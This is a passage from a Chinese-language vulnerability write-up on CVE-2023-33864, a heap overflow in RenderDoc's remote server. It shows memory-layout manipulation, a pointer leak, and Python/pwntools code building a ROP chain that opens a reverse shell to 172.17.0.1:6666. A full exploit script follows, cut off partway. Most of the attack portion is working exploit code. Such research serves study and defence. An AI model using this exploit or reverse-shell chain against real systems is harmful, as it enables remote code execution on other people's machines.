<p>当释放 new callstack 的时候，new callstack 本身的地址为 0x7fdcac012000，由于堆溢出 prev_size = 0xfffffffffec12000，size = 0x1bef007，这样不仅绕过了if检查，而且最终的 munmap的参数形态为：__munmap((char *) 0x7fdcad400000, 0x81000);</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">munmap_chunk</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">pagesize</span> <span class="o">=</span> <span class="n">GLRO</span> <span class="p">(</span><span class="n">dl_pagesize</span><span class="p">);</span>
  <span class="n">INTERNAL_SIZE_T</span> <span class="n">size</span> <span class="o">=</span> <span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  
  <span class="n">assert</span> <span class="p">(</span><span class="n">chunk_is_mmapped</span> <span class="p">(</span><span class="n">p</span><span class="p">));</span>
	<span class="p">...</span>
  <span class="kt">uintptr_t</span> <span class="n">mem</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">chunk2mem</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  <span class="kt">uintptr_t</span> <span class="n">block</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uintptr_t</span><span class="p">)</span> <span class="n">p</span> <span class="o">-</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
  <span class="kt">size_t</span> <span class="n">total_size</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="n">size</span><span class="p">;</span>
  
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">((</span><span class="n">block</span> <span class="o">|</span> <span class="n">total_size</span><span class="p">)</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))</span> <span class="o">!=</span> <span class="mi">0</span>
      <span class="o">||</span> <span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">powerof2</span> <span class="p">(</span><span class="n">mem</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">pagesize</span> <span class="o">-</span> <span class="mi">1</span><span class="p">))))</span>
    <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"munmap_chunk(): invalid pointer"</span><span class="p">);</span>
	<span class="p">...</span>
  <span class="n">__munmap</span> <span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">block</span><span class="p">,</span> <span class="n">total_size</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<p>因此造成了任意地址 munmap，在 GAP 内存区域得到了一块未被映射的内存。</p>

<p>在前面的第 2 步堆喷射中，GAP 区域被全部占满。任意地址 munmap 之后，在 GAP 区域造成了一块长度为 0x81000 的空洞，该空洞距离 new callstack 大约为 19MB。</p>

<p>当下一个 client 调试线程起来的时候，线程栈就会占据这个空洞。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_7_%E9%A1%B5.jpg" alt="renderdoc-第 7 页.jpg" /></p>

<ol>
  <li>
    <p>连接 server ，分配一个 client 调试线程，该线程会占据上述内存空洞。</p>

    <p>这个线程对应的 client name 是 “tmptmp”，该线程后面是要被替换掉的。</p>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">tmp_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">tmptmp</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">th_tmp</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">tmp_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">th_tmp</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
</code></pre></div></div>

<ol>
  <li>重新连接 server ，再起一个 client 调试线程，这个线程要做 3 件事情：
    <ul>
      <li>踢掉前面的 tmptmp 线程</li>
      <li>分配长度为 0xdee870 的 client name 字符串（大约 13MB）</li>
      <li>起了新的调试线程代替之前的 tmptmp线程</li>
    </ul>
  </li>
</ol>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">long_live_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0xdee870</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x03</span><span class="sh">'</span> <span class="o">*</span>  <span class="mh">0xdee870</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="c1"># kick 字段设置为1，表示踢掉前面的 tmptmp 线程
</span>    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x04</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="n">th_long_live</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="nc">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">long_live_thread</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
<span class="n">th_long_live</span><span class="p">.</span><span class="nf">start</span><span class="p">()</span>
</code></pre></div></div>

<p>踢掉 tmptmp 线程是为了回收内存空洞，设置 kick 字段为1，server 就会对 tmptmp 线程调用pthread_join 回收线程资源，0x81000 的栈就会被 pthread 回收，这个回收并不是释放给系统，而是加入到了 pthread 维护的一个链表，下次 pthread_create 线程的时候从链表中取出给新的线程使用。</p>

<p>分配长度为 0xdee870 的 client name。</p>

<p>client name 会被复制一次，因此总共会分配两个连续的堆块用于存放 client name，总长度大约 26MB，正好覆盖到部分的内存空洞。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.31.00.png" alt="截屏2025-05-27 21.31.00.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_8_%E9%A1%B5.jpg" alt="renderdoc-第 8 页.jpg" /></p>

<p>这部分内存空洞虽然已被使用，但是归属于 vma 子系统管理，堆管理器并不能感知到这块被任意 munmap出来的区域正在使用。所以在扩展堆空间的时候，直接调用mprotect将这块空洞包含在内的区域设置为RW就返回给 malloc 使用，造成了 client name 侵占部分的空洞。</p>

<p>随后起了新的调试线程替代之前的 tmptmp 线程。新的调试线程从 pthread 维护的链表中取得了刚被释放的长度为0x81000的栈，往这块区域写入了栈数据，覆盖了部分的 client name，后面当server 把 client name 返回给 client 的时候就会把这部分栈数据带出来，其中就包含了攻击者想要的指针信息。</p>

<ol>
  <li>泄漏堆指针、代码段指针、libc 指针</li>
</ol>

<p>这时候再连进去一个 client，kick字段设置为0。</p>

<p>当client进去后发现有调试线程正在运行，由于 kick = 0，server 不起新的调试线程，把已存在的 client name 返回给当前请求。</p>

<p>由于 client name 部分已被调试线程的栈所覆盖，其中必然遗留了代码段地址。</p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.38.48.png" alt="截屏2025-05-27 21.38.48.png" /></p>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/%E6%88%AA%E5%B1%8F2025-05-27_21.51.09.png" alt="截屏2025-05-27 21.51.09.png" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    
<span class="c1"># do not kick out the long-live thread
</span><span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
			   <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">qts588</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        
<span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    
<span class="n">recv_buf</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">''</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">recv_buf</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="nf">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="p">:</span>
        <span class="k">break</span>
    
<span class="n">tag_index</span> <span class="o">=</span> <span class="n">recv_buf</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="se">\x10\x00\x00\x00\x03\x03\x03\x03</span><span class="sh">'</span><span class="p">)</span>
<span class="n">heap_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">80</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">text_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">88</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">96</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
<span class="n">libc_addr</span> <span class="o">=</span> <span class="nf">u64</span><span class="p">(</span><span class="n">recv_buf</span><span class="p">[</span><span class="n">tag_index</span><span class="o">+</span><span class="mi">40</span> <span class="p">:</span> <span class="n">tag_index</span><span class="o">+</span><span class="mi">48</span><span class="p">].</span><span class="nf">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">))</span>
</code></pre></div></div>

<ol>
  <li>
    <p>再次连进去一个 client ，其中 kick = 0，client name 部分构造 rop 链。</p>

    <p>新的 client name 彻底覆盖了调试线程的栈，我们可以在栈上面大量喷洒 ret 指令的地址，当 19 号线程的某个函数返回的时候就会进入 ret 滑板地址，一直滑到 rop 的反弹shell部分。</p>

    <p>由于堆地址在第 7 步中已经泄漏出来，因此我们很容易定位 “/bin/bash” 字符串的地址。</p>
  </li>
</ol>

<p><img src="/assets/posts/2025-05-27-CVE-2023-33864-RenderDoc堆溢出漏洞分析/renderdoc-%E7%AC%AC_9_%E9%A1%B5.jpg" alt="renderdoc-第 9 页.jpg" /></p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">rop_chain</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span>
<span class="c1">#struct sockaddr_in   172.17.0.1:6666
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x010011ac0a1a0002</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mh">0x0000556b2b358120</span><span class="p">)</span>
    
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">)</span> <span class="o">*</span> <span class="mh">0x26c</span>
<span class="c1"># int fd = socket(AF_INET, SOCK_STREAM, 0);
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">socket_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 0)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 1)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># dup2(7, 2)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">dup2_addr</span><span class="p">)</span>
<span class="c1"># connect(fd, (struct sockaddr *)&amp;serv_addr, sizeof(serv_addr));
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">sockaddr_addr</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdx_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">connect_addr</span><span class="p">)</span>
<span class="c1"># execv("/bin/sh", NULL)
</span><span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rdi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span> 
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">pop_rsi_ret_addr</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">rop_chain</span> <span class="o">+=</span> <span class="nf">p64</span><span class="p">(</span><span class="n">execv_addr</span><span class="p">)</span>
<span class="n">rop_chain</span><span class="p">.</span><span class="nf">rjust</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x00</span><span class="sh">'</span><span class="p">)</span>
    
<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="p">)</span>
<span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> \
         <span class="nf">p32</span><span class="p">(</span><span class="mh">0x900000</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span> <span class="o">+</span> \
         <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
             
<span class="n">p</span><span class="p">.</span><span class="nf">sendline</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="漏洞利用代码">漏洞利用代码</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span>
<span class="c1"># Author: qiutianshu
# Date: 2025/05/21
</span>
<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="n">socket</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">import</span> <span class="n">threading</span>

<span class="n">text_off</span> <span class="o">=</span> <span class="mh">0x8e000</span>
<span class="n">ret_offset</span> <span class="o">=</span> <span class="mh">0x8E01A</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x560a27</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rsi_ret</span> <span class="o">=</span> <span class="mh">0x164dfe</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rdx_ret</span> <span class="o">=</span> <span class="mh">0xe4192</span><span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rax_ret</span> <span class="o">=</span> <span class="mh">0x21c987</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rbx_ret</span> <span class="o">=</span> <span class="mh">0x1d73d5</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">pop_rcx_ret</span> <span class="o">=</span> <span class="mh">0x2235f2</span> <span class="o">-</span> <span class="n">text_off</span>
<span class="n">xchg_rdi_rax_ret</span> <span class="o">=</span> <span class="mh">0x146eebc</span> <span class="o">-</span> <span class="n">text_off</span>

<span class="k">def</span> <span class="nf">tmp_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x6</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">tmptmp</span><span class="sh">'</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">def</span> <span class="nf">long_live_thread</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">):</span>
    <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> \
        <span class="nf">p32</span><span class="p">(</span><span class="mh">0xdee870</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x03</span><span class="sh">'</span> <span class="o">*</span>  <span class="mh">0xdee870</span>
        
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="n">packet</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x04</span><span class="sh">'</span> <span class="o">*</span> <span class="mh">0x80</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="k">pass</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
    <span class="k">if</span> <span class="nf">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">'</span><span class="s">Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> &lt;ip&gt; &lt;port&gt;</span><span class="sh">'</span><span class="p">)</span>
        <span class="n">sys</span><span class="p">.</span><span class="nf">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    
    <span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
    <span class="n">port</span> <span class="o">=</span> <span class="nf">int</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
    <span class="n">ChunkCallstackFlag</span> <span class="o">=</span> <span class="mh">0x00010000</span>

<span class="c1"># step 1: 制造内存泄露，填补server线程到库文件之间的gap
# 
#     0                                       64M
# ----V----------------------------------------V--------------|-------------
#     |          server thread's heap          |  random gap  |  libraries
# ----|----------------------------------------|--------------|-------------
#
#  建立7个连续的连接, 每个连接会 clone 出一个新的线程，每个线程glibc会分配 8MB + 4KB 的栈空间
#  目的是为了缩小 server thread 堆到库文件映射之间的gap。
#  新的线程因为不满足校验而退出，但源程序没有用到pthread_join，造成了每个线程的 8MB + 4KB 内存泄露
# 
</span>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nf">range</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
        <span class="nf">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">s</span> <span class="o">=</span> <span class="nf">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
        <span class="n">packet</span> <span class="o">=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x2</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">9</span><span class="p">)</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x5</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="sh">'</span><span class="s">root</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="sh">'</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span> <span class="o">+</span> <span class="nf">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mh">0x40</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">sendall</span><span class="p">(</span><span class="n">packet</span><span class="p">)</span>
        <span class="n">s</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
